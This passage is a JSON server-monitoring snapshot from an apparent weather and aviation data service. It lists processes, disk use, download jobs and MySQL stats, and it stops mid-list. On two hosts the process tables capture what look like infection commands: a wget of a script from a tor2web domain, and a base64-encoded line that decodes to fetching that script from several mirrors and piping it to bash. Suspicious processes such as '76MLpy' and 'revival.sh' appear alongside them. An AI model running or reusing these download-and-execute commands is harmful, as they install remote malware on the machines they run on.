@@ -1,0 +1,451 @@
+{
+  "delay": 0,
+  "code": 0,
+  "data": {
+    "server": [
+      {
+        "host": "192.6.1.20",
+        "cpu": {
+          "memory_free": "284.0625M",
+          "cpu_use": "11%"
+        },
+        "disk": {
+          "disk0": "866G 58G 809G 7%",
+          "disk1": "3.6T 3.2T 449G 88%"
+        },
+        "pid": {
+          "/usr/local/jdk1.8.0_92/bin/java -Djava.util.logging.config.file=/data/app_data/program/apache-tomcat-smokedate/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.endorsed.dirs=/data/app_data/program/apache-tomcat-smokedate/endorsed -classpath /data/app_data/program/apache-tomcat-smokedate/bin/bootstrap.jar:/data/app_data/program/apache-tomcat-smokedate/bin/tomcat-juli.jar -Dcatalina.base=/data/app_data/program/apache-tomcat-smokedate -Dcatalina.home=/data/app_data/program/apache-tomcat-smokedate -Djava.io.tmpdir=/data/app_data/program/apache-tomcat-smokedate/temp org.apache.catalina.startup.Bootstrap start ": "44",
+          "java -Xms256M -Xmx2048M -server -jar /home/app/xhms/cityFC3-7004/cityFC3.jar 7004 ": "62",
+          "ps -o nlwp,pid,lwp,args -u app ": "1",
+          "/usr/libexec/openssh/sftp-server ": "1",
+          "/usr/bin/python /home/app/meteo_server/meteo_down_python/wavewatch/gwes/gwes.py ": "1",
+          "sshd: app@pts/6 ": "1",
+          "apollo -ea -server -Xmx1G -XX:+HeapDumpOnOutOfMemoryError -XX:-UseBiasedLocking -Dcom.sun.management.jmxremote -Dapollo.home=/home/app/server/apache-apollo-1.7.1 -Dapollo.base=/home/app/server/apache-apollo-1.7.1/bin/mybroker -classpath /home/app/server/apache-apollo-1.7.1/lib/apollo-boot.jar org.apache.activemq.apollo.boot.Apollo /home/app/server/apache-apollo-1.7.1/bin/mybroker/lib\\;/home/app/server/apache-apollo-1.7.1/lib org.apache.activemq.apollo.cli.Apollo run ": "129",
+          "sshd: app@pts/4 ": "1",
+          "java -Xms256M -Xmx1500M -server -jar /home/app/xhms/nmcreal-7008/nmcrealFC7008.jar 7008 ": "51",
+          "total": 1406,
+          "java -server -Xms128m -Xmx512m -jar zuul-gateway.jar 7020 ": "102",
+          "/usr/local/jdk1.8.0_92/bin/java -Djava.util.logging.config.file=/data/app_data/program/apache-tomcat-8.5.6/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -classpath /data/app_data/program/apache-tomcat-8.5.6/bin/bootstrap.jar:/data/app_data/program/apache-tomcat-8.5.6/bin/tomcat-juli.jar -Dcatalina.base=/data/app_data/program/apache-tomcat-8.5.6 -Dcatalina.home=/data/app_data/program/apache-tomcat-8.5.6 -Djava.io.tmpdir=/data/app_data/program/apache-tomcat-8.5.6/temp org.apache.catalina.startup.Bootstrap start ": "67",
+          "java -Xms256M -Xmx2048M -server -jar /home/app/xhms/gfsCache-7002/gfscache.jar 7002 ": "62",
+          "python3 nc_analysis_redis_7.py ": "11",
+          "java -Xms256M -Xmx1500M -server -jar /home/app/xhms/airportLamp-7019/airportLamp.jar 7019 ": "73",
+          "python3 nc_analysis_redis_19.py ": "11",
+          "sshd: app@notty ": "1",
+          "java -server -Xms512m -Xmx1024m -jar /home/app/xhms/xchk-7010/xchk.jar 7010 ": "71",
+          "bash -c ps -o nlwp,pid,lwp,args -u app|sort -n ": "1",
+          "python3 wind100_redis.py ": "11",
+          "-bash ": "1",
+          "java -server -Xmx456m -jar /home/app/xhms/jssy-7012/jssy.jar 7012 ": "61",
+          "/usr/local/src/jdk1.8.0_152/bin/java -Djava.util.logging.config.file=/home/app/meteo_server/xhweatherfcsys/7065/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /home/app/meteo_server/xhweatherfcsys/7065/bin/bootstrap.jar:/home/app/meteo_server/xhweatherfcsys/7065/bin/tomcat-juli.jar -Dcatalina.base=/home/app/meteo_server/xhweatherfcsys/7065 -Dcatalina.home=/home/app/meteo_server/xhweatherfcsys/7065 -Djava.io.tmpdir=/home/app/meteo_server/xhweatherfcsys/7065/temp org.apache.catalina.startup.Bootstrap start ": "81",
+          "sshd: app@pts/11 ": "1",
+          "java -Xms256M -Xmx512M -jar airworthproduct.jar ": "38",
+          "tail -f -n 200 catalina.out ": "1",
+          "tail -f nohup.out -n 200 ": "1",
+          "java -Xms256M -Xmx2048M -server -jar NMCProcess.jar ": "227",
+          "java -Xms256M -Xmx1500M -server -jar /home/app/xhms/nmcreal-7007/nmcrealFC7007.jar 7007 ": "62",
+          "sshd: app@pts/1 ": "1",
+          "java -Xms256M -Xmx2048M -server -jar /home/app/xhms/nwpc-7000/nwpc.jar 7000 ": "62",
+          "java -server -Xms256m -Xmx4096m -jar processandsave-ocean1suofc.jar ": "35",
+          "[sort] ": "1",
+          "tail -f nohup.out -n 10000 ": "1",
+          "/usr/local/src/jdk1.8.0_152/bin/java -Djava.util.logging.config.file=/home/app/meteo_server/xhweatherfcsys/7060/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /home/app/meteo_server/xhweatherfcsys/7060/bin/bootstrap.jar:/home/app/meteo_server/xhweatherfcsys/7060/bin/tomcat-juli.jar -Dcatalina.base=/home/app/meteo_server/xhweatherfcsys/7060 -Dcatalina.home=/home/app/meteo_server/xhweatherfcsys/7060 -Djava.io.tmpdir=/home/app/meteo_server/xhweatherfcsys/7060/temp org.apache.catalina.startup.Bootstrap start ": "36",
+          "/usr/local/src/jdk1.8.0_152/bin/java -Djava.util.logging.config.file=/home/app/server/apache-tomcat-8.5.24/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dignore.endorsed.dirs= -classpath /home/app/server/apache-tomcat-8.5.24/bin/bootstrap.jar:/home/app/server/apache-tomcat-8.5.24/bin/tomcat-juli.jar -Dcatalina.base=/home/app/server/apache-tomcat-8.5.24 -Dcatalina.home=/home/app/server/apache-tomcat-8.5.24 -Djava.io.tmpdir=/home/app/server/apache-tomcat-8.5.24/temp org.apache.catalina.startup.Bootstrap start ": "91"
+        }
+      },
+      {
+        "host": "192.6.1.21",
+        "cpu": {
+          "memory_free": "77587.35M",
+          "cpu_use": "3%"
+        },
+        "disk": {
+          "disk0": "518G 313G 179G 64%",
+          "disk1": "28T 8.8T 19T 33%"
+        },
+        "pid": {
+          "ps -o nlwp,pid,lwp,args -u app ": "1",
+          "/usr/libexec/openssh/sftp-server ": "1",
+          "python3 /home/app/radar/sysMonitor/SchedulerMonitor.py ": "11",
+          "/usr/java/jdk1.8.0_131/bin/java -Djava.util.logging.config.file=/home/app/meteo_server/tomcat-app4ocean/8082/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dignore.endorsed.dirs= -classpath /home/app/meteo_server/tomcat-app4ocean/8082/bin/bootstrap.jar:/home/app/meteo_server/tomcat-app4ocean/8082/bin/tomcat-juli.jar -Dcatalina.base=/home/app/meteo_server/tomcat-app4ocean/8082 -Dcatalina.home=/home/app/meteo_server/tomcat-app4ocean/8082 -Djava.io.tmpdir=/home/app/meteo_server/tomcat-app4ocean/8082/temp org.apache.catalina.startup.Bootstrap start ": "86",
+          "java -Xms256M -Xmx2048M -server -jar /home/app/test/nwpc.jar 7000 ": "67",
+          "sshd: app@pts/8 ": "1",
+          "python3 capture_jx_putinto_redis_province_1.py ": "1",
+          "sh monitor-restart-py.sh capture_jx_putinto_redis_province_1 ": "1",
+          "sleep 600 ": "1",
+          "python3 /home/app/meteo_server/meteo_down_python/fcimg/nmefc_winddownload.py ": "11",
+          "total": 705,
+          "/usr/java/jdk1.8.0_131/bin/java -Djava.util.logging.config.file=/home/app/meteo_server/tomcat-app4ocean/8443/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dignore.endorsed.dirs= -classpath /home/app/meteo_server/tomcat-app4ocean/8443/bin/bootstrap.jar:/home/app/meteo_server/tomcat-app4ocean/8443/bin/tomcat-juli.jar -Dcatalina.base=/home/app/meteo_server/tomcat-app4ocean/8443 -Dcatalina.home=/home/app/meteo_server/tomcat-app4ocean/8443 -Djava.io.tmpdir=/home/app/meteo_server/tomcat-app4ocean/8443/temp org.apache.catalina.startup.Bootstrap start ": "87",
+          "python3 capture_jx_putinto_redis_province_2.py ": "1",
+          "sshd: app@notty ": "1",
+          "bash -c ps -o nlwp,pid,lwp,args -u app|sort -n ": "1",
+          "/usr/java/jdk1.8.0_131/bin/java -Djava.util.logging.config.file=/home/app/meteo_server/tomcat-app4ocean/8088/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dignore.endorsed.dirs= -classpath /home/app/meteo_server/tomcat-app4ocean/8088/bin/bootstrap.jar:/home/app/meteo_server/tomcat-app4ocean/8088/bin/tomcat-juli.jar -Dcatalina.base=/home/app/meteo_server/tomcat-app4ocean/8088 -Dcatalina.home=/home/app/meteo_server/tomcat-app4ocean/8088 -Djava.io.tmpdir=/home/app/meteo_server/tomcat-app4ocean/8088/temp org.apache.catalina.startup.Bootstrap start ": "92",
+          "-bash ": "1",
+          "python3 /home/app/meteo_server/meteo_down_python/fcimg/nmefc_pre_wavedownload.py ": "11",
+          "python3 /home/app/meteo_server/meteo_down_python/fcimg/nmefc_realtime.py ": "11",
+          "sort -n ": "1",
+          "python3 /home/app/meteo_server/meteo_down_python/fcimg/nmefc_curdownload.py ": "11",
+          "python3 /home/app/meteo_server/meteo_down_python/fcimg/nmefc_tempdownload.py ": "11",
+          "sh monitor-restart-py.sh capture_jx_putinto_redis_province_2 ": "1",
+          "python3 -u /home/app/radar/radar_simple/SchedulerJob.py ": "11",
+          "/usr/java/jdk1.8.0_131/bin/java -Djava.util.logging.config.file=/home/app/meteo_server/tomcat-app4ocean/8445/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dignore.endorsed.dirs= -classpath /home/app/meteo_server/tomcat-app4ocean/8445/bin/bootstrap.jar:/home/app/meteo_server/tomcat-app4ocean/8445/bin/tomcat-juli.jar -Dcatalina.base=/home/app/meteo_server/tomcat-app4ocean/8445 -Dcatalina.home=/home/app/meteo_server/tomcat-app4ocean/8445 -Djava.io.tmpdir=/home/app/meteo_server/tomcat-app4ocean/8445/temp org.apache.catalina.startup.Bootstrap start ": "87",
+          "python3 /home/app/meteo_server/meteo_down_python/fcimg/envform.py ": "11",
+          "sshd: app@pts/10 ": "1",
+          "ping 220.242.131.62 ": "1",
+          "python3 /home/app/meteo_server/meteo_down_python/imocwx_wavedownload.py ": "11",
+          "python3 /home/app/meteo_server/meteo_down_python/fcimg/nmefc_saltdownload.py ": "11",
+          "/usr/java/jdk1.8.0_131/bin/java -Djava.util.logging.config.file=/home/app/meteo_server/tomcat-app4ocean/8085/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dignore.endorsed.dirs= -classpath /home/app/meteo_server/tomcat-app4ocean/8085/bin/bootstrap.jar:/home/app/meteo_server/tomcat-app4ocean/8085/bin/tomcat-juli.jar -Dcatalina.base=/home/app/meteo_server/tomcat-app4ocean/8085 -Dcatalina.home=/home/app/meteo_server/tomcat-app4ocean/8085 -Djava.io.tmpdir=/home/app/meteo_server/tomcat-app4ocean/8085/temp org.apache.catalina.startup.Bootstrap start ": "86",
+          "java -server -Xms256m -Xmx2048m -jar wavewatch-process.jar ": "64"
+        }
+      },
+      {
+        "host": "123.59.100.107",
+        "cpu": {
+          "memory_free": "429.59766M",
+          "cpu_use": "7%"
+        },
+        "disk": {
+          "disk0": "29G 18G 63% /",
+          "disk1": "275G 225G 37G 87%"
+        },
+        "pid": {
+          "wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.xyz/i.sh ": "1",
+          "ps -o nlwp,pid,lwp,args -u app ": "1",
+          "-bash ": "1",
+          "76MLpy ": "11",
+          "java -jar jbdbCopy.jar ": "34",
+          "sshd: app@internal-sftp ": "1",
+          "sort -n ": "1",
+          "java -jar wari8download_2.jar ": "39",
+          "/bin/sh ./cnt.sh ": "1",
+          "sh -c printf ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovc2JpbjovYmluOi91c3Ivc2JpbjovdXNyL2JpbjovdXNyL2xvY2FsL2JpbgoKKHdnZXQgLXFPLSAtVS0gaHR0cHM6Ly9kZGdzZGs2b291Nnpuc2RuLnRvcjJ3ZWIuaW8vaS5zaHx8d2dldCAtcU8tIC1VLSBodHRwOi8vZGRnc2RrNm9vdTZ6bnNkbi50b3Iyd2ViLm1lL2kuc2h8fHdnZXQgLXFPLSAtVS0gaHR0cHM6Ly9kZGdzZGs2b291Nnpuc2RuLnRvcjJ3ZWIueHl6L2kuc2h8fHdnZXQgLXFPLSAtVS0gaHR0cHM6Ly9kZGdzZGs2b291Nnpuc2RuLm9uaW9uLndzL2kuc2gpfGJhc2gK|base64 -d|bash ": "1",
+          "total": 2914,
+          "/bin/sh ./revival.sh ": "1",
+          "java -XX:MaxPermSize=192m -Djava.io.tmpdir=./tmp -Djava.net.preferIPv4Stack=true -Dcom.sun.jndi.ldap.connect.pool.protocol=plain ssl -Xms256m -Xmx768m -Djava.library.path=bin/jsw/lib -classpath bin/jsw/lib/wrapper-3.2.3.jar:./lib/jul-to-slf4j-1.7.6.jar:./lib/jetty-server-8.1.11.v20130520.jar:./lib/jetty-jmx-8.1.11.v20130520.jar:./lib/javax.servlet-3.0.0.v201112011016.jar:./lib/jetty-http-8.1.11.v20130520.jar:./lib/metrics-jetty-2.2.0.jar:./lib/logback-access-1.1.2.jar:./lib/jetty-rewrite-8.1.11.v20130520.jar:./lib/metrics-core-2.2.0.jar:./lib/logback-core-1.1.2.jar:./lib/jetty-servlet-8.1.11.v20130520.jar:./lib/metrics-logback-2.2.0.jar:./lib/jetty-continuation-8.1.11.v20130520.jar:./lib/jetty-security-8.1.11.v20130520.jar:./lib/jetty-deploy-8.1.11.v20130520.jar:./lib/jetty-io-8.1.11.v20130520.jar:./lib/slf4j-api-1.7.6.jar:./lib/nexus-bootstrap-2.11.1-01.jar:./lib/jetty-util-8.1.11.v20130520.jar:./lib/logback-classic-1.1.2.jar:./lib/plexus-interpolation-1.16.jar:./lib/jetty-client-8.1.11.v20130520.jar:./lib/jetty-xml-8.1.11.v20130520.jar:./lib/jetty-webapp-8.1.11.v20130520.jar:./conf/ -Dwrapper.key=nrYX_MLsWFcS4CC3 -Dwrapper.port=32000 -Dwrapper.jvm.port.min=31000 -Dwrapper.jvm.port.max=31999 -Dwrapper.pid=16138 -Dwrapper.version=3.2.3 -Dwrapper.native_library=wrapper -Dwrapper.service=TRUE -Dwrapper.cpu.timeout=10 -Dwrapper.jvmid=1 org.sonatype.nexus.bootstrap.jsw.JswLauncher ./conf/jetty.xml ./conf/jetty-requestlog.xml ": "100",
+          "/bin/dbus-daemon --fork --print-pid 4 --print-address 6 --session ": "1",
+          "sleep 1200 ": "1",
+          "sshd: app@notty ": "1",
+          "/usr/local/jdk1.8.0_92/bin/java -Djava.util.logging.config.file=/home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -classpath /home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083/bin/bootstrap.jar:/home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083/bin/tomcat-juli.jar -Dcatalina.base=/home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083 -Dcatalina.home=/home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083 -Djava.io.tmpdir=/home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083/temp org.apache.catalina.startup.Bootstrap start ": "61",
+          "bash ": "1",
+          "/home/app/nexus-2.11.1-01/bin/../bin/jsw/linux-x86-64/wrapper /home/app/nexus-2.11.1-01/bin/../bin/jsw/conf/wrapper.conf wrapper.syslog.ident=nexus wrapper.pidfile=/home/app/nexus-2.11.1-01/bin/../bin/jsw/linux-x86-64/nexus.pid wrapper.daemonize=TRUE ": "2",
+          "java -jar zuul-gateway.jar 7020 ": "77",
+          "apollo -ea -server -Xmx1G -XX:+HeapDumpOnOutOfMemoryError -XX:-UseBiasedLocking -Dcom.sun.management.jmxremote -Dapollo.home=/usr/local/apollo-1.7.1/apache-apollo-1.7.1 -Dapollo.base=/usr/local/apollo-1.7.1/apache-apollo-1.7.1/mqtt -classpath /usr/local/apollo-1.7.1/apache-apollo-1.7.1/lib/apollo-boot.jar org.apache.activemq.apollo.boot.Apollo /usr/local/apollo-1.7.1/apache-apollo-1.7.1/mqtt/lib\\;/usr/local/apollo-1.7.1/apache-apollo-1.7.1/lib org.apache.activemq.apollo.cli.Apollo run ": "476",
+          "bash -c ps -o nlwp,pid,lwp,args -u app|sort -n ": "1",
+          "java -jar wari8download_1.jar ": "35",
+          "/usr/local/jdk1.8.0_92/bin/java -Djava.util.logging.config.file=/home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -classpath /home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100/bin/bootstrap.jar:/home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100/bin/tomcat-juli.jar -Dcatalina.base=/home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100 -Dcatalina.home=/home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100 -Djava.io.tmpdir=/home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100/temp org.apache.catalina.startup.Bootstrap start ": "55"
+        }
+      },
+      {
+        "host": "47.93.6.45",
+        "cpu": {
+          "memory_free": "862.4258M",
+          "cpu_use": "4%"
+        },
+        "disk": {
+          "disk0": "40G 5.7G 32G 16%",
+          "disk1": "493G 137G 331G 30%"
+        },
+        "pid": {
+          "java -server -Xmx1024M -jar xhms-euraka.jar ": "37",
+          "ps -o nlwp,pid,lwp,args -u app ": "1",
+          "sshd: app@pts/1 ": "1",
+          "total": 2357,
+          "-bash ": "1",
+          "python3 metar_tarf_putinto_mysql_time_04min_34min_2.py ": "11",
+          "python36 capture_jx_putinto_redis_ali.py ": "1",
+          "java -jar downloadGFS.jar ": "2291",
+          "sort -n ": "1",
+          "python3 -u /home/app/radarCatch/SchedulerJob.py ": "11",
+          "sshd: app@notty ": "1",
+          "bash -c ps -o nlwp,pid,lwp,args -u app|sort -n ": "1"
+        }
+      },
+      {
+        "host": "192.168.1.114",
+        "cpu": {
+          "memory_free": "814.21875M",
+          "cpu_use": "10%"
+        },
+        "disk": {
+          "disk0": "885G 441G 400G 53%",
+          "disk1": "5.0T 4.3T 461G 91%"
+        },
+        "pid": {
+          "ps -o nlwp,pid,lwp,args -u app ": "1",
+          "76MLpy ": "11",
+          "sshd: app@internal-sftp ": "1",
+          "total": 2915,
+          "sshd: app@notty ": "1",
+          "bash ": "1",
+          "apollo -ea -server -Xmx1G -XX:+HeapDumpOnOutOfMemoryError -XX:-UseBiasedLocking -Dcom.sun.management.jmxremote -Dapollo.home=/usr/local/apollo-1.7.1/apache-apollo-1.7.1 -Dapollo.base=/usr/local/apollo-1.7.1/apache-apollo-1.7.1/mqtt -classpath /usr/local/apollo-1.7.1/apache-apollo-1.7.1/lib/apollo-boot.jar org.apache.activemq.apollo.boot.Apollo /usr/local/apollo-1.7.1/apache-apollo-1.7.1/mqtt/lib\\;/usr/local/apollo-1.7.1/apache-apollo-1.7.1/lib org.apache.activemq.apollo.cli.Apollo run ": "476",
+          "bash -c ps -o nlwp,pid,lwp,args -u app|sort -n ": "1",
+          "/usr/local/jdk1.8.0_92/bin/java -Djava.util.logging.config.file=/home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -classpath /home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100/bin/bootstrap.jar:/home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100/bin/tomcat-juli.jar -Dcatalina.base=/home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100 -Dcatalina.home=/home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100 -Djava.io.tmpdir=/home/app/meteo_server/apache-tomcat-8.5.4-monitor-8100/temp org.apache.catalina.startup.Bootstrap start ": "55",
+          "wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.xyz/i.sh ": "1",
+          "-bash ": "1",
+          "java -jar jbdbCopy.jar ": "34",
+          "sort -n ": "1",
+          "java -jar wari8download_2.jar ": "39",
+          "/bin/sh ./cnt.sh ": "1",
+          "sh -c printf ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovc2JpbjovYmluOi91c3Ivc2JpbjovdXNyL2JpbjovdXNyL2xvY2FsL2JpbgoKKHdnZXQgLXFPLSAtVS0gaHR0cHM6Ly9kZGdzZGs2b291Nnpuc2RuLnRvcjJ3ZWIuaW8vaS5zaHx8d2dldCAtcU8tIC1VLSBodHRwOi8vZGRnc2RrNm9vdTZ6bnNkbi50b3Iyd2ViLm1lL2kuc2h8fHdnZXQgLXFPLSAtVS0gaHR0cHM6Ly9kZGdzZGs2b291Nnpuc2RuLnRvcjJ3ZWIueHl6L2kuc2h8fHdnZXQgLXFPLSAtVS0gaHR0cHM6Ly9kZGdzZGs2b291Nnpuc2RuLm9uaW9uLndzL2kuc2gpfGJhc2gK|base64 -d|bash ": "1",
+          "/bin/sh ./revival.sh ": "1",
+          "java -XX:MaxPermSize=192m -Djava.io.tmpdir=./tmp -Djava.net.preferIPv4Stack=true -Dcom.sun.jndi.ldap.connect.pool.protocol=plain ssl -Xms256m -Xmx768m -Djava.library.path=bin/jsw/lib -classpath bin/jsw/lib/wrapper-3.2.3.jar:./lib/jul-to-slf4j-1.7.6.jar:./lib/jetty-server-8.1.11.v20130520.jar:./lib/jetty-jmx-8.1.11.v20130520.jar:./lib/javax.servlet-3.0.0.v201112011016.jar:./lib/jetty-http-8.1.11.v20130520.jar:./lib/metrics-jetty-2.2.0.jar:./lib/logback-access-1.1.2.jar:./lib/jetty-rewrite-8.1.11.v20130520.jar:./lib/metrics-core-2.2.0.jar:./lib/logback-core-1.1.2.jar:./lib/jetty-servlet-8.1.11.v20130520.jar:./lib/metrics-logback-2.2.0.jar:./lib/jetty-continuation-8.1.11.v20130520.jar:./lib/jetty-security-8.1.11.v20130520.jar:./lib/jetty-deploy-8.1.11.v20130520.jar:./lib/jetty-io-8.1.11.v20130520.jar:./lib/slf4j-api-1.7.6.jar:./lib/nexus-bootstrap-2.11.1-01.jar:./lib/jetty-util-8.1.11.v20130520.jar:./lib/logback-classic-1.1.2.jar:./lib/plexus-interpolation-1.16.jar:./lib/jetty-client-8.1.11.v20130520.jar:./lib/jetty-xml-8.1.11.v20130520.jar:./lib/jetty-webapp-8.1.11.v20130520.jar:./conf/ -Dwrapper.key=nrYX_MLsWFcS4CC3 -Dwrapper.port=32000 -Dwrapper.jvm.port.min=31000 -Dwrapper.jvm.port.max=31999 -Dwrapper.pid=16138 -Dwrapper.version=3.2.3 -Dwrapper.native_library=wrapper -Dwrapper.service=TRUE -Dwrapper.cpu.timeout=10 -Dwrapper.jvmid=1 org.sonatype.nexus.bootstrap.jsw.JswLauncher ./conf/jetty.xml ./conf/jetty-requestlog.xml ": "100",
+          "/bin/dbus-daemon --fork --print-pid 4 --print-address 6 --session ": "1",
+          "sleep 1200 ": "1",
+          "smbd -D ": "1",
+          "/usr/local/jdk1.8.0_92/bin/java -Djava.util.logging.config.file=/home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -classpath /home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083/bin/bootstrap.jar:/home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083/bin/tomcat-juli.jar -Dcatalina.base=/home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083 -Dcatalina.home=/home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083 -Djava.io.tmpdir=/home/app/meteo_server/apache-tomcat-8.5.4-aviation-8083/temp org.apache.catalina.startup.Bootstrap start ": "61",
+          "/home/app/nexus-2.11.1-01/bin/../bin/jsw/linux-x86-64/wrapper /home/app/nexus-2.11.1-01/bin/../bin/jsw/conf/wrapper.conf wrapper.syslog.ident=nexus wrapper.pidfile=/home/app/nexus-2.11.1-01/bin/../bin/jsw/linux-x86-64/nexus.pid wrapper.daemonize=TRUE ": "2",
+          "java -jar zuul-gateway.jar 7020 ": "77",
+          "java -jar wari8download_1.jar ": "35"
+        }
+      }
+    ],
+    "deal": [
+      {
+        "host": "192.6.1.20",
+        "DEAL2,海洋一所数据处理,processandsave-ocean1suofc.jar": true,
+        "DEAL1,机场报文处理程序,airworthproduct.jar": true
+      },
+      {
+        "host": "192.168.1.114",
+        "DEAL3,GFS处理程序,gfs-process.jar": true
+      }
+    ],
+    "download": [
+      {
+        "DOWNLOWD1,下载nwpc数据进行解析,nc_analysis_redis_7.py": true,
+        "host": "192.6.1.20",
+        "DOWNLOWD2,下载nwpc数据进行解析,nc_analysis_redis_19.py": true,
+        "DOWNLOWD3,下载风电数据,wind100_redis.py": true
+      },
+      {
+        "DOWNLOWD12,海洋局盐度数值预报下载,nmefc_saltdownload.py": true,
+        "DOWNLOWD13,海洋局浪温实况图下载,nmefc_realtime.py": true,
+        "DOWNLOWD4,中央气象台网站定时抓取城镇精细预报信息,capture_jx_putinto_redis_province_1.py": true,
+        "DOWNLOWD7,近海环境预报下载,envform.py": true,
+        "DOWNLOWD8,海洋局海流数值预报下载,nmefc_curdownload.py": true,
+        "host": "192.6.1.21",
+        "DOWNLOWD9,海洋局海面风数值预报下载,nmefc_winddownload.py": true,
+        "DOWNLOWD5,中央气象台网站定时抓取城镇精细预报信息,capture_jx_putinto_redis_province_2.py": true,
+        "DOWNLOWD6,日本海浪预报下载,imocwx_wavedownload.py": true,
+        "DOWNLOWD10,海洋局海表温数值预报下载,nmefc_tempdownload.py": true,
+        "DOWNLOWD11,海洋局海浪数值预报下载,nmefc_pre_wavedownload.py": true
+      },
+      {
+        "host": "47.93.6.45",
+        "DOWNLOWD14,华北气象信息共享网机场报,metar_tarf_putinto_mysql_time_04min_34min_2.py": true,
+        "DOWNLOWD15,GFS下载处理程序,downloadGFS.jar": true
+      },
+      {
+        "host": "192.168.1.114",
+        "DOWNLOWD16,GFS下载处理程序,downloadGFS.jar": true
+      }
+    ],
+    "mysql": [
+      {
+        " Opens:": "40",
+        " Queries per second avg:": "3.498",
+        " Slow queries:": "3",
+        "Uptime:": "14089192",
+        " Questions:": "49284250",
+        " Open tables:": "54",
+        "host": "192.6.1.20",
+        " Flush tables:": "2",
+        " Threads:": "2"
+      },
+      {
+        "host": "47.93.6.45"
+      },
+      {
+        " Opens:": "14246",
+        " Queries per second avg:": "10.979",
+        " Slow queries:": "19270",
+        "Uptime:": "41730653",
+        " Questions:": "458183583",
+        " Open tables:": "64",
+        "host": "192.168.1.114",
+        " Flush tables:": "1",
+        " Threads:": "27"
+      }
+    ],
+    "interface": {
+      "Model": "interface",
+      "Body": {
+        "SG15,TYPHOON原始数据(单年),": true,
+        "SG31,新宏_航空气象服务接口 雷达、云图接口 云图,": true,
+        "SP10,114gfs,xhms-gfs.jar": true,
+        "SG84,新宏_航空气象服务接口 葵花8号 二级产品多点同一时间数据查询,": true,
+        "SG63,新宏_航空气象服务接口 机场、航班及航线信息查询 航班及航线信息查询,": true,
+        "SG69,新宏_航空气象服务接口 民航机场实况、预报 根据经纬度准确查询民航机场信息,": true,
+        "SP6,新晨,2天3h预报,(未使用),nmcrealFC7007.jar": true,
+        "SG82,新宏_航空气象服务接口 葵花8号 二级产品多点同一时间数据查询,": true,
+        "SG92,新宏_航空气象服务接口 气象要素图例查询 解释应用 垂直风切变,": true,
+        "SG9,海洋一所区域要素数据,": false,
+        "SG62,新宏_航空气象服务接口 机场、航班及航线信息查询 机场信息查询,": true,
+        "SG2,新晨城镇单点预报,cityFC3.jar": false,
+        "SG8,海洋一所等值线,": false,
+        "SG65,新宏_航空气象服务接口 机场、航班及航线信息查询 模糊查询航路点信息,": true,
+        "SG71,新宏_航空气象服务接口 民航机场实况、预报 根据要素、机场四字码查询时序数据列表,": false,
